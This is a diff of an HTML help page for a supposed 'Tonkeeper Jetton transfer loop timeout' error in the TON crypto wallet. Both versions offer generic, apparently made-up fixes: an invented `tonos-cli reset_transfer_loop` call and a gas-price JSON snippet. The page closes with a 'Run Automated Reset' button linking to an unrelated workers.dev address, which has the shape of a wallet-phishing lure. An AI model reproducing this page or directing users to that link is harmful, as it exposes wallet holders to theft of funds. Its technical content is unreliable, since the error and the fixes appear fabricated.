@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tonkeeper Jetton Transfer Loop Timeout</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #1a1a24;
+        font-family: sans-serif;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -25,7 +25,7 @@
     }
     a { color: #00adb5; }
     .btn {
-        background: #ff7b2c;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,28 +41,33 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer jettons, indicating a failure in the transaction process due to a timeout in the loop that handles the transfer.</li>
+<li>Users experience a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer jettons within the TON ecosystem, resulting in failed transactions and frustration.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a prolonged delay in the transaction confirmation process, exceeding the predefined timeout threshold set by the Tonkeeper system for jetton transfers, which is crucial for maintaining the integrity and efficiency of transactions within the TON ecosystem.</li>
+<li>The error occurs due to a timeout in the Tonkeeper Jetton transfer loop, often caused by network congestion, incorrect configuration, or insufficient gas for the transaction.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can attempt the following manual overrides:</li>
-<li>Increase the timeout threshold in the Tonkeeper settings to allow for more time for transaction confirmation.</li>
-<li>Check the blockchain for any congestion that might be causing delays in transaction processing.</li>
-<li>Utilize the following command to manually reset the transfer loop:</li>
+<li>To resolve the issue, try the following:</li>
+<li>Increase the transaction timeout value to allow for longer processing times.</li>
+<li>Verify that the Tonkeeper wallet is properly configured and synced with the TON network.</li>
+<li>Adjust the gas price to ensure sufficient funds for the transaction, as shown in the following example:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span>-6<span class="w"> </span>&lt;transfer_contract_address&gt;<span class="w"> </span>reset_transfer_loop<span class="w"> </span><span class="o">{}</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;transaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;gas_price&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1000000000</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;gas_limit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">100000</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for advanced troubleshooting and diagnostics. </p>
+<p>Consider utilizing an external console for more advanced troubleshooting and configuration adjustments. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A basic understanding of the TON blockchain and its ecosystem.</li>
-<li>Familiarity with the Tonkeeper interface and its settings.</li>
-<li>Access to the <code>tonos-cli</code> command-line tool for interacting with the TON blockchain.</li>
+<li>Tonkeeper wallet installed and configured</li>
+<li>Basic understanding of TON network and transaction mechanics</li>
+<li>Sufficient TON coins for transaction fees</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
